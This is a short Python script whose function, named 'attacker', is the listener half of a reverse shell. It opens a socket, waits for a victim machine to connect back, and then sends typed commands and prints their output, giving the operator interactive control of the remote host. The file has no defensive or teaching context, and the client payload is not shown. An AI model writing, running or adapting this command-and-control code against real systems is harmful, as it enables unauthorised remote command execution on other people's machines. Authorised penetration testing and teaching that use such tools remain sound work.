import socket

def attacker(listen_ip, listen_port):
    ATTACKER_HOST = listen_ip
    ATTACKER_PORT = int(listen_port)
    BUFFER_SIZE = 1024 * 128
    SEPARATOR = "<sep>"

    s = socket.socket()
    s.bind((ATTACKER_HOST, ATTACKER_PORT))
    s.listen(1)

    print(f"Listening as {ATTACKER_HOST} : {ATTACKER_PORT} ...")

    client_socket, client_address = s.accept()
    print(f"{client_address[0]} : {client_address[1]} Connected!")

    cwd = client_socket.recv(BUFFER_SIZE).decode("utf-8")
    print("[+] Current working directory:", cwd)

    while True:
        command = input(f"{cwd} $> ")
        if not command.strip():
            # empty command
            continue
        # send the command to the client
        client_socket.send(command.encode())
        if command.lower() == "exit":
            break
        # retrieve command result
        output = client_socket.recv(BUFFER_SIZE).decode()
        results, cwd = output.split(SEPARATOR)
        print(results)
    